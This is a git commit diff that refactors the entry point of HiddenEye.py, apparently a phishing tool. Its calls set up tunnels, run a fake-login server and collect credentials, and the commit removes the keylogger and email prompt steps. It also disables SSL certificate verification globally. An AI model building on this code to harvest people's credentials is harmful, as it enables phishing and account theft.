b3f86706c38a2e95998bc456ab0d1ce8cc682f41
HACKINTER <ceh.ec.counselor147@gmail.com>
2024-10-28 19:01:37 +0600

    Update HiddenEye.py

--- HiddenEye.py
+++ HiddenEye.py
@@ -13,45 +13,46 @@ import sys
 import ssl
 from os import system, environ
 
-if(not environ.get('PYTHONHTTPSVERIFY', "") and getattr(ssl, '_create_unverified_context', None)):
+# Set default SSL context
+if not environ.get('PYTHONHTTPSVERIFY', "") and getattr(ssl, '_create_unverified_context', None):
     ssl._create_default_https_context = ssl._create_unverified_context
 
-
+# Color codes for terminal output
 RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
-checkPermissions()
-installGetText()
-languageSelector()
-checkConnection()
-verCheck()
-checkPHP()
-checkLocalxpose()
-checkNgrok()
-checkOpenport()
-checkPagekite()
-checkLT()
-ifSettingsNotExists()
-readConfig()
 
-if __name__ == "__main__":
+def main():
+    checkPermissions()
+    installGetText()
+    languageSelector()
+    checkConnection()
+    verCheck()
+    checkPHP()
+    checkLocalxpose()
+    checkNgrok()
+    checkOpenport()
+    checkPagekite()
+    checkLT()
+    ifSettingsNotExists()
+    readConfig()
+
     try:
         runMainMenu()
         mainMenu()
-
-        keyloggerprompt()
-        addingkeylogger()
-        cloudfarePrompt()
-        emailPrompt()
-        inputCustom()
-        port = selectPort()
-
-        ##############
-        runServer(port)
-        selectServer(port)
-
-        multiprocessing.Process(target=runServer, args=(port,)).start()
-        getCredentials(port)
-
+        startProcesses()
     except KeyboardInterrupt:
-        port = '8080' # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
-        endMessage(port)
-        exit()
+        handleKeyboardInterrupt()
+
+def startProcesses():
+    """Start server and credential collection processes."""
+    port = selectPort()
+    multiprocessing.Process(target=runServer, args=(port,)).start()
+    getCredentials(port)
+
+def handleKeyboardInterrupt():
+    """Handle keyboard interrupt gracefully."""
+    port = '8080'  # Default port
+    endMessage(port)
+    exit()
+
+if __name__ == "__main__":
+    main()
